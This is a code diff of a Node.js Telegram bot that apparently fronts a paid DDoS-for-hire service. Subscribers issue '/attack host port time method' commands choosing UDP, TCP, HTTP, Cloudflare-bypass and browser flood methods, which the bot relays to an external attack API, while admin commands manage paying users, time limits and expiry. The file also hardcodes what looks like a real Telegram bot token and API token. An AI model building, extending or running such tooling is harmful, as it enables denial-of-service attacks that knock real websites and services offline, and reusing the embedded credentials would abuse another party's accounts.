@@ -1,391 +1,491 @@
+// bot.js - Main Telegram Bot File
 const { Telegraf } = require('telegraf');
 const fs = require('fs');
 const axios = require('axios');
-const express = require('express');
-const http = require('http');
+const moment = require('moment');
 
 // Load configuration
-const loadConfig = () => {
-  return JSON.parse(fs.readFileSync('./config.json', 'utf8'));
-};
-
-// Load methods
-const loadMethods = () => {
-  return JSON.parse(fs.readFileSync('./methods.json', 'utf8'));
-};
-
-// Save configuration
-const saveConfig = (config) => {
+let config = {};
+try {
+  config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
+} catch (error) {
+  // Create default config if file doesn't exist
+  config = {
+    users: {},
+    adminId: 6456655262,
+    notificationGroupId: -4764306375,
+    apiUrl: "https://apikey-production.up.railway.app/api/attack",
+    apiToken: "dispenser"
+  };
   fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
-};
+}
 
-// User management functions
-const isAuthorized = (userId, config) => {
-  return config.users.hasOwnProperty(userId);
-};
+// Load attack methods
+let methods = [];
+try {
+  methods = JSON.parse(fs.readFileSync('./methods.json', 'utf8'));
+} catch (error) {
+  console.error('Error loading methods.json:', error.message);
+  // Create default methods if file doesn't exist
+  methods = [
+    { "name": "UDP", "description": "UDP flood method" },
+    { "name": "SPIKE", "description": "TCP flood method" },
+    { "name": "HTTP", "description": "HTTP flood method" },
+    { "name": "CF", "description": "CF flood method" },
+    { "name": "BROWSER", "description": "Browser flood method" }
+  ];
+  fs.writeFileSync('./methods.json', JSON.stringify(methods, null, 2));
+}
 
-const isExpired = (userId, config) => {
-  const user = config.users[userId];
-  if (!user) return true;
-  
-  const expiryDate = new Date(user.expired);
-  return new Date() > expiryDate;
-};
+// Initialize bot
+const bot = new Telegraf('7177796181:AAG6SwfRa7ajhCsIPITPbmYHydU3VuqHkbg');
 
-const isOnCooldown = (userId, config) => {
+// Track ongoing attacks
+const ongoingAttacks = new Map();
+
+// Helper function to save config
+function saveConfig() {
+  fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
+}
+
+// Helper function to check if user exists and has access
+function checkUserAccess(userId) {
+  return config.users[userId] !== undefined;
+}
+
+// Helper function to check if user is admin
+function isAdmin(userId) {
+  return parseInt(userId) === config.adminId;
+}
+
+// Helper function to check if user has available slots
+function hasAvailableSlot(userId) {
   const user = config.users[userId];
   if (!user) return false;
   
-  if (!user.lastRequest) return false;
+  // Count user's ongoing attacks
+  let userOngoingAttacks = 0;
+  ongoingAttacks.forEach((attack) => {
+    if (attack.userId === userId) userOngoingAttacks++;
+  });
   
-  const cooldownTime = user.cooldown || config.defaultCooldown;
-  const timeSinceLastRequest = (Date.now() - user.lastRequest) / 1000;
-  return timeSinceLastRequest < cooldownTime;
-};
+  return userOngoingAttacks < user.concurrentLimit;
+}
 
-const getCooldownRemaining = (userId, config) => {
+// Helper function to check if user token is valid
+function isValidToken(userId) {
   const user = config.users[userId];
-  if (!user || !user.lastRequest) return 0;
+  if (!user) return false;
   
-  const cooldownTime = user.cooldown || config.defaultCooldown;
-  const timeSinceLastRequest = (Date.now() - user.lastRequest) / 1000;
-  return Math.max(0, cooldownTime - timeSinceLastRequest);
-};
+  // Check if user has an expiry date and if it's passed
+  if (user.expiryDate) {
+    const now = moment();
+    const expiry = moment(user.expiryDate, 'YYYY-MM-DD');
+    if (now.isAfter(expiry)) return false;
+  }
+  
+  return true;
+}
 
-const hasReachedConcurrentLimit = (userId, config) => {
+// Format time remaining for a user's token
+function formatTimeRemaining(userId) {
   const user = config.users[userId];
-  if (!user) return true;
+  if (!user || !user.expiryDate) return "No expiry date set";
   
-  return (user.activeRequests || 0) >= user.concurrent;
-};
+  const now = moment();
+  const expiry = moment(user.expiryDate, 'YYYY-MM-DD');
+  if (now.isAfter(expiry)) return "Expired";
+  
+  const days = expiry.diff(now, 'days');
+  return `${days} days remaining`;
+}
 
-// Initialize the bot
-const initBot = () => {
-  const config = loadConfig();
-  const bot = new Telegraf(config.botToken);
-  
-  // Setup middleware for user authorization
-  bot.use(async (ctx, next) => {
-    const userId = ctx.from.id.toString();
-    
-    // Check if user is authorized
-    if (!isAuthorized(userId, config)) {
-      return ctx.reply('❌ You are not authorized to use this bot. Please contact the administrator.');
-    }
-    
-    // Check if user account is expired
-    if (isExpired(userId, config)) {
-      return ctx.reply('❌ Your account has expired. Please contact the administrator to renew your subscription.');
-    }
-    
-    await next();
-  });
-  
-  // Start command
-  bot.start((ctx) => {
-    const userId = ctx.from.id.toString();
-    const username = ctx.from.username || ctx.from.first_name;
-    const user = config.users[userId];
-    
-    let message = `Welcome, ${username}! 👋\n\n`;
-    message += `Your account expires on: ${user.expired}\n`;
-    message += `Concurrent requests: ${user.concurrent}\n`;
-    message += `Max request time: ${user.maxtime} seconds\n`;
-    message += `Cooldown: ${user.cooldown} seconds\n\n`;
-    message += `Available commands:\n`;
-    message += `/start - Show this message\n`;
-    message += `/methods - Show available API methods\n`;
-    message += `/attack <target> <port> <time> <method> - Send API request\n`;
-    message += `/status - Check your account status`;
-    
-    ctx.reply(message);
-  });
-  
-  // Methods command
-  bot.command('methods', async (ctx) => {
-    try {
-      const methods = loadMethods();
-      let message = '📋 Available Methods:\n\n';
-      
-      for (const method of methods) {
-        message += `• ${method.name} - ${method.description}\n`;
-      }
-      
-      ctx.reply(message);
-    } catch (error) {
-      console.error('Error displaying methods:', error);
-      ctx.reply('❌ Error loading methods. Please try again later.');
-    }
-  });
-  
-  // Status command
-  bot.command('status', (ctx) => {
-    const userId = ctx.from.id.toString();
-    const user = config.users[userId];
-    
-    let message = `📊 Account Status:\n\n`;
-    message += `Expiration: ${user.expired}\n`;
-    message += `Concurrent limit: ${user.concurrent}\n`;
-    message += `Active requests: ${user.activeRequests || 0}\n`;
-    message += `Cooldown: ${user.cooldown} seconds\n`;
-    
-    if (isOnCooldown(userId, config)) {
-      message += `⏱️ Cooldown remaining: ${getCooldownRemaining(userId, config).toFixed(1)} seconds\n`;
-    } else {
-      message += `✅ Ready to use\n`;
-    }
-    
-    ctx.reply(message);
-  });
-  
-  // Attack command
-  bot.command('attack', async (ctx) => {
-    const userId = ctx.from.id.toString();
-    const user = config.users[userId];
-    const config = loadConfig(); // Reload config
-    
-    // Parse command arguments
-    const args = ctx.message.text.split(' ').slice(1);
-    if (args.length < 4) {
-      return ctx.reply('❌ Usage: /attack <target> <port> <time> <method>');
-    }
-    
-    const [target, port, time, method] = args;
-    
-    // Validate time
-    const requestedTime = parseInt(time);
-    if (isNaN(requestedTime) || requestedTime <= 0) {
-      return ctx.reply('❌ Invalid time parameter. Please use a positive number.');
-    }
-    
-    // Check if time exceeds user's max time
-    if (requestedTime > user.maxtime) {
-      return ctx.reply(`❌ Time exceeds your maximum allowed time (${user.maxtime} seconds).`);
-    }
-    
-    // Check cooldown
-    if (isOnCooldown(userId, config)) {
-      const cooldownRemaining = getCooldownRemaining(userId, config);
-      return ctx.reply(`❌ You are on cooldown. Please wait ${cooldownRemaining.toFixed(1)} seconds.`);
-    }
-    
-    // Check concurrent limit
-    if (hasReachedConcurrentLimit(userId, config)) {
-      return ctx.reply('❌ You have reached your concurrent requests limit.');
-    }
-    
-    // Check if method exists
-    const methods = loadMethods();
-    const methodExists = methods.some(m => m.name.toLowerCase() === method.toLowerCase());
-    if (!methodExists) {
-      return ctx.reply('❌ Invalid method. Use /methods to see available methods.');
-    }
-    
-    try {
-      // Update user stats
-      config.users[userId].lastRequest = Date.now();
-      config.users[userId].activeRequests = (config.users[userId].activeRequests || 0) + 1;
-      saveConfig(config);
-      
-      // Send waiting message
-      ctx.reply(`🔄 Processing request...`);
-      
-      // Make API request
-      const response = await axios.get(`${config.apiUrl}`, {
-        params: {
-          token: user.token,
-          target: target,
-          port: port,
-          time: time,
-          method: method
-        }
-      });
-      
-      // Create message with request details
-      let message = `✅ Request sent successfully!\n\n`;
-      message += `📌 Target: ${target}\n`;
-      message += `🔌 Port: ${port}\n`;
-      message += `⏱️ Time: ${time} seconds\n`;
-      message += `📋 Method: ${method}\n`;
-      
-      if (response.data) {
-        message += `\n🔄 API Response: ${JSON.stringify(response.data)}`;
-      }
-      
-      ctx.reply(message);
-      
-      // Set a timeout to reduce active requests when done
-      setTimeout(() => {
-        const updatedConfig = loadConfig();
-        if (updatedConfig.users[userId].activeRequests > 0) {
-          updatedConfig.users[userId].activeRequests--;
-          saveConfig(updatedConfig);
-        }
-      }, requestedTime * 1000);
-      
-    } catch (error) {
-      console.error('API request error:', error);
-      ctx.reply(`❌ Error sending request: ${error.message}`);
-      
-      // Reset active requests on error
-      const updatedConfig = loadConfig();
-      if (updatedConfig.users[userId].activeRequests > 0) {
-        updatedConfig.users[userId].activeRequests--;
-        saveConfig(updatedConfig);
-      }
-    }
-  });
-  
-  // Admin commands (only for the admin user)
-  bot.command('adduser', (ctx) => {
-    const userId = ctx.from.id.toString();
-    if (userId !== config.adminId) {
-      return ctx.reply('❌ You are not authorized to use admin commands.');
-    }
-    
-    const args = ctx.message.text.split(' ').slice(1);
-    if (args.length < 5) {
-      return ctx.reply('❌ Usage: /adduser <userId> <expiry_date> <maxtime> <concurrent> <cooldown>');
-    }
-    
-    const [newUserId, expiry, maxtime, concurrent, cooldown] = args;
-    
-    const updatedConfig = loadConfig();
-    updatedConfig.users[newUserId] = {
-      expired: expiry, // Format: YYYY-MM-DD
-      maxtime: parseInt(maxtime),
-      concurrent: parseInt(concurrent),
-      cooldown: parseInt(cooldown),
-      token: `user_${newUserId}_${Date.now()}`
-    };
-    
-    saveConfig(updatedConfig);
-    ctx.reply(`✅ User ${newUserId} added successfully.`);
-  });
-  
-  return bot;
-};
-
-// Create config.json if it doesn't exist
-const createConfigIfNotExists = () => {
-  if (!fs.existsSync('./config.json')) {
-    const defaultConfig = {
-      botToken: "7177796181:AAG6SwfRa7ajhCsIPITPbmYHydU3VuqHkbg",
-      apiUrl: "https://apikey-production.up.railway.app/api/attack",
-      defaultCooldown: 60,
-      adminId: "ADMIN_TELEGRAM_ID", // Replace with your Telegram ID
-      users: {
-        "ADMIN_TELEGRAM_ID": { // Replace with your Telegram ID
-          expired: "2025-12-31",
-          maxtime: 300,
-          concurrent: 5,
-          cooldown: 30,
-          token: "isalmods"
-        }
-      }
-    };
-    
-    fs.writeFileSync('./config.json', JSON.stringify(defaultConfig, null, 2));
-    console.log('Created default config.json');
-  }
-};
-
-// Create methods.json if it doesn't exist
-const createMethodsIfNotExists = () => {
-  if (!fs.existsSync('./methods.json')) {
-    const defaultMethods = [
-      {
-        "name": "UDP",
-        "description": "UDP flood method"
-      },
-      {
-        "name": "TCP",
-        "description": "TCP flood method"
-      },
-      {
-        "name": "HTTP",
-        "description": "HTTP flood method"
-      }
-    ];
-    
-    fs.writeFileSync('./methods.json', JSON.stringify(defaultMethods, null, 2));
-    console.log('Created default methods.json');
-  }
-};
-
-// Main function
-const setupExpressServer = () => {
-  const app = express();
-  const PORT = process.env.PORT || 8080;
-  
-  // Simple route to show the bot is online
-  app.get('/', (req, res) => {
-    res.send(`
-      <!DOCTYPE html>
-      <html>
-        <head>
-          <title>Telegram Bot</title>
-          <style>
-            body {
-              font-family: Arial, sans-serif;
-              display: flex;
-              justify-content: center;
-              align-items: center;
-              height: 100vh;
-              margin: 0;
-              background-color: #f5f5f5;
-            }
-            .container {
-              text-align: center;
-              padding: 20px;
-              background-color: white;
-              border-radius: 10px;
-              box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            }
-            .status {
-              color: #4CAF50;
-              font-weight: bold;
-            }
-            .time {
-              color: #555;
-              margin-top: 10px;
-            }
-          </style>
-        </head>
-        <body>
-          <div class="container">
-            <h1>Telegram Bot Server</h1>
-            <p class="status">✅ Bot is running</p>
-            <p class="time">Server time: ${new Date().toLocaleString()}</p>
-          </div>
-        </body>
-      </html>
-    `);
-  });
-  
-  // Start the server
-  app.listen(PORT, () => {
-    console.log(`Express server running on port ${PORT}`);
-  });
-};
-
-const main = async () => {
-  createConfigIfNotExists();
-  createMethodsIfNotExists();
-  
-  // Set up express server
-  setupExpressServer();
-  
-  // Start telegram bot
-  const bot = initBot();
-  bot.launch();
-  console.log('Telegram bot started successfully!');
-  
-  // Enable graceful stop
-  process.once('SIGINT', () => bot.stop('SIGINT'));
-  process.once('SIGTERM', () => bot.stop('SIGTERM'));
-};
-
-main().catch(error => {
-  console.error('Bot error:', error);
+// Start command
+bot.start((ctx) => {
+  ctx.reply('Welcome to the Attack Management Bot. Use /help to see available commands.');
 });
+
+// Help command
+bot.help((ctx) => {
+  if (isAdmin(ctx.from.id)) {
+    ctx.reply(
+      'Available commands:\n' +
+      '/attack host port time method - Launch an attack\n' +
+      '/methods - Show available attack methods\n' +
+      '/status - Check your account status\n' +
+      '/ongoing - List all ongoing attacks\n' +
+      '/stop attackId - Stop a specific attack\n\n' +
+      'Admin commands:\n' +
+      '/addusr userId token maxTime concurrentLimit expiryDays - Add a new user\n' +
+      '/delusr userId - Delete a user\n' +
+      '/updateusr userId token|maxTime|concurrentLimit|expiryDays value - Update user property\n' +
+      '/listusers - List all users'
+    );
+  } else if (checkUserAccess(ctx.from.id)) {
+    ctx.reply(
+      'Available commands:\n' +
+      '/attack host port time method - Launch an attack\n' +
+      '/methods - Show available attack methods\n' +
+      '/status - Check your account status\n' +
+      '/ongoing - List your ongoing attacks\n' +
+      '/stop attackId - Stop a specific attack'
+    );
+  } else {
+    ctx.reply('You do not have access to this bot. Please contact the administrator.');
+  }
+});
+
+// Attack command
+bot.command('attack', async (ctx) => {
+  const userId = ctx.from.id.toString();
+  
+  // Check if user has access
+  if (!checkUserAccess(userId)) {
+    return ctx.reply('You do not have access to this bot. Please contact the administrator.');
+  }
+  
+  // Check if token is valid (not expired)
+  if (!isValidToken(userId)) {
+    return ctx.reply('Your token has expired. Please contact the administrator.');
+  }
+  
+  // Check if user has available slots
+  if (!hasAvailableSlot(userId)) {
+    return ctx.reply(`You have reached your concurrent attack limit (${config.users[userId].concurrentLimit}).`);
+  }
+  
+  // Parse command parameters
+  const args = ctx.message.text.split(' ').slice(1);
+  if (args.length !== 4) {
+    return ctx.reply('Usage: /attack host port time method\nUse /methods to see available attack methods.');
+  }
+  
+  const [host, port, time, method] = args;
+  
+  // Validate parameters
+  if (!host || !port || !time || !method) {
+    return ctx.reply('All parameters are required.');
+  }
+  
+  // Validate method
+  const validMethod = methods.find(m => m.name.toUpperCase() === method.toUpperCase());
+  if (!validMethod) {
+    return ctx.reply(`Invalid method: ${method}\nUse /methods to see available attack methods.`);
+  }
+  
+  // Check if time is within user's limit
+  const maxTime = config.users[userId].maxTime;
+  if (parseInt(time) > maxTime) {
+    return ctx.reply(`Attack time exceeds your limit of ${maxTime} seconds.`);
+  }
+  
+  // Generate unique attack ID
+  const attackId = Date.now().toString();
+  
+  try {
+    // Send notification to the group
+    await bot.telegram.sendMessage(
+      config.notificationGroupId,
+      `🚨 Attack launched by User ID: ${userId}\n` +
+      `🎯 Target: ${host}:${port}\n` +
+      `⏱️ Duration: ${time} seconds\n` +
+      `🔧 Method: ${method}\n` +
+      `🔑 Attack ID: ${attackId}`
+    );
+    
+    // Send request to API
+    const apiUrl = `${config.apiUrl}?token=${config.apiToken}&target=${host}&time=${time}&method=${method}&port=${port}`;
+    const response = await axios.get(apiUrl);
+    
+    // Store attack details
+    ongoingAttacks.set(attackId, {
+      userId,
+      host,
+      port,
+      time: parseInt(time),
+      method,
+      startTime: Date.now(),
+      attackId
+    });
+    
+    // Auto-remove attack after duration + 2s buffer
+    setTimeout(() => {
+      ongoingAttacks.delete(attackId);
+      ctx.reply(`Attack ${attackId} has completed.`);
+    }, parseInt(time) * 1000 + 2000);
+    
+    // Reply to user
+    ctx.reply(
+      `✅ Attack launched successfully!\n` +
+      `🎯 Target: ${host}:${port}\n` +
+      `⏱️ Duration: ${time} seconds\n` +
+      `🔧 Method: ${method}\n` +
+      `🔑 Attack ID: ${attackId}`
+    );
+    
+  } catch (error) {
+    console.error('API Error:', error.message);
+    ctx.reply(`❌ Error launching attack: ${error.message}`);
+  }
+});
+
+// Status command
+bot.command('status', (ctx) => {
+  const userId = ctx.from.id.toString();
+  
+  if (!checkUserAccess(userId)) {
+    return ctx.reply('You do not have access to this bot. Please contact the administrator.');
+  }
+  
+  const user = config.users[userId];
+  
+  // Count user's ongoing attacks
+  let userOngoingAttacks = 0;
+  ongoingAttacks.forEach((attack) => {
+    if (attack.userId === userId) userOngoingAttacks++;
+  });
+  
+  ctx.reply(
+    `📊 Account Status:\n` +
+    `👤 User ID: ${userId}\n` +
+    `⏱️ Max Time: ${user.maxTime} seconds\n` +
+    `🔢 Concurrent Limit: ${user.concurrentLimit}\n` +
+    `🔄 Currently Running: ${userOngoingAttacks}/${user.concurrentLimit}\n` +
+    `⏳ Subscription: ${formatTimeRemaining(userId)}`
+  );
+});
+
+// List ongoing attacks
+bot.command('ongoing', (ctx) => {
+  const userId = ctx.from.id.toString();
+  
+  if (!checkUserAccess(userId)) {
+    return ctx.reply('You do not have access to this bot. Please contact the administrator.');
+  }
+  
+  if (ongoingAttacks.size === 0) {
+    return ctx.reply('No ongoing attacks.');
+  }
+  
+  let message = '🔄 Ongoing Attacks:\n\n';
+  
+  // For admins, show all attacks; for users, only show their attacks
+  ongoingAttacks.forEach((attack) => {
+    if (isAdmin(userId) || attack.userId === userId) {
+      const elapsedTime = Math.floor((Date.now() - attack.startTime) / 1000);
+      const remainingTime = Math.max(0, attack.time - elapsedTime);
+      
+      message += 
+        `🔑 ID: ${attack.attackId}\n` +
+        `👤 User: ${attack.userId}\n` +
+        `🎯 Target: ${attack.host}:${attack.port}\n` +
+        `⏱️ Time: ${elapsedTime}s / ${attack.time}s (${remainingTime}s remaining)\n` +
+        `🔧 Method: ${attack.method}\n\n`;
+    }
+  });
+  
+  if (message === '🔄 Ongoing Attacks:\n\n') {
+    return ctx.reply('You have no ongoing attacks.');
+  }
+  
+  ctx.reply(message);
+});
+
+// Stop attack command
+bot.command('stop', (ctx) => {
+  const userId = ctx.from.id.toString();
+  
+  if (!checkUserAccess(userId)) {
+    return ctx.reply('You do not have access to this bot. Please contact the administrator.');
+  }
+  
+  const attackId = ctx.message.text.split(' ')[1];
+  if (!attackId) {
+    return ctx.reply('Usage: /stop attackId');
+  }
+  
+  const attack = ongoingAttacks.get(attackId);
+  if (!attack) {
+    return ctx.reply(`Attack with ID ${attackId} not found.`);
+  }
+  
+  // Only admins or the attack owner can stop an attack
+  if (!isAdmin(userId) && attack.userId !== userId) {
+    return ctx.reply('You do not have permission to stop this attack.');
+  }
+  
+  // Remove attack from ongoing list
+  ongoingAttacks.delete(attackId);
+  
+  // In a real implementation, you would call an API to stop the attack here
+  
+  ctx.reply(`✅ Attack ${attackId} has been stopped.`);
+});
+
+// Admin commands
+// Add user
+bot.command('addusr', (ctx) => {
+  const adminId = ctx.from.id.toString();
+  
+  if (!isAdmin(adminId)) {
+    return ctx.reply('You are not authorized to use this command.');
+  }
+  
+  const args = ctx.message.text.split(' ').slice(1);
+  if (args.length !== 5) {
+    return ctx.reply('Usage: /addusr userId token maxTime concurrentLimit expiryDays');
+  }
+  
+  const [userId, token, maxTime, concurrentLimit, expiryDays] = args;
+  
+  // Calculate expiry date
+  const expiryDate = moment().add(parseInt(expiryDays), 'days').format('YYYY-MM-DD');
+  
+  // Add user to config
+  config.users[userId] = {
+    token,
+    maxTime: parseInt(maxTime),
+    concurrentLimit: parseInt(concurrentLimit),
+    expiryDate
+  };
+  
+  saveConfig();
+  
+  ctx.reply(
+    `✅ User added successfully!\n` +
+    `👤 User ID: ${userId}\n` +
+    `🔑 Token: ${token}\n` +
+    `⏱️ Max Time: ${maxTime} seconds\n` +
+    `🔢 Concurrent Limit: ${concurrentLimit}\n` +
+    `📅 Expires on: ${expiryDate}`
+  );
+});
+
+// Delete user
+bot.command('delusr', (ctx) => {
+  const adminId = ctx.from.id.toString();
+  
+  if (!isAdmin(adminId)) {
+    return ctx.reply('You are not authorized to use this command.');
+  }
+  
+  const userId = ctx.message.text.split(' ')[1];
+  if (!userId) {
+    return ctx.reply('Usage: /delusr userId');
+  }
+  
+  if (!config.users[userId]) {
+    return ctx.reply(`User ${userId} not found.`);
+  }
+  
+  delete config.users[userId];
+  saveConfig();
+  
+  ctx.reply(`✅ User ${userId} has been deleted.`);
+});
+
+// Update user property
+bot.command('updateusr', (ctx) => {
+  const adminId = ctx.from.id.toString();
+  
+  if (!isAdmin(adminId)) {
+    return ctx.reply('You are not authorized to use this command.');
+  }
+  
+  const args = ctx.message.text.split(' ').slice(1);
+  if (args.length !== 3) {
+    return ctx.reply('Usage: /updateusr userId property value');
+  }
+  
+  const [userId, property, value] = args;
+  
+  if (!config.users[userId]) {
+    return ctx.reply(`User ${userId} not found.`);
+  }
+  
+  switch (property) {
+    case 'token':
+      config.users[userId].token = value;
+      break;
+    case 'maxTime':
+      config.users[userId].maxTime = parseInt(value);
+      break;
+    case 'concurrentLimit':
+      config.users[userId].concurrentLimit = parseInt(value);
+      break;
+    case 'expiryDays':
+      const expiryDate = moment().add(parseInt(value), 'days').format('YYYY-MM-DD');
+      config.users[userId].expiryDate = expiryDate;
+      break;
+    default:
+      return ctx.reply('Invalid property. Valid properties: token, maxTime, concurrentLimit, expiryDays');
+  }
+  
+  saveConfig();
+  
+  ctx.reply(`✅ User ${userId} updated successfully. ${property} set to ${value}.`);
+});
+
+// List all users
+bot.command('listusers', (ctx) => {
+  const adminId = ctx.from.id.toString();
+  
+  if (!isAdmin(adminId)) {
+    return ctx.reply('You are not authorized to use this command.');
+  }
+  
+  const userIds = Object.keys(config.users);
+  
+  if (userIds.length === 0) {
+    return ctx.reply('No users found.');
+  }
+  
+  let message = '👥 User List:\n\n';
+  
+  userIds.forEach((userId) => {
+    const user = config.users[userId];
+    message += 
+      `👤 User ID: ${userId}\n` +
+      `⏱️ Max Time: ${user.maxTime} seconds\n` +
+      `🔢 Concurrent Limit: ${user.concurrentLimit}\n` +
+      `⏳ Subscription: ${formatTimeRemaining(userId)}\n\n`;
+  });
+  
+  ctx.reply(message);
+});
+
+// List available methods
+bot.command('methods', (ctx) => {
+  const userId = ctx.from.id.toString();
+  
+  if (!checkUserAccess(userId)) {
+    return ctx.reply('You do not have access to this bot. Please contact the administrator.');
+  }
+  
+  let message = '🔧 Available Attack Methods:\n\n';
+  
+  methods.forEach((method) => {
+    message += `• ${method.name} - ${method.description}\n`;
+  });
+  
+  message += '\nUsage: /attack host port time method';
+  
+  ctx.reply(message);
+});
+
+// Handle errors
+bot.catch((err, ctx) => {
+  console.error('Bot error:', err);
+  ctx.reply('An error occurred. Please try again later.');
+});
+
+// Start bot
+bot.launch().then(() => {
+  console.log('Bot is running...');
+}).catch(err => {
+  console.error('Failed to start bot:', err);
+});
+
+// Enable graceful stop
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
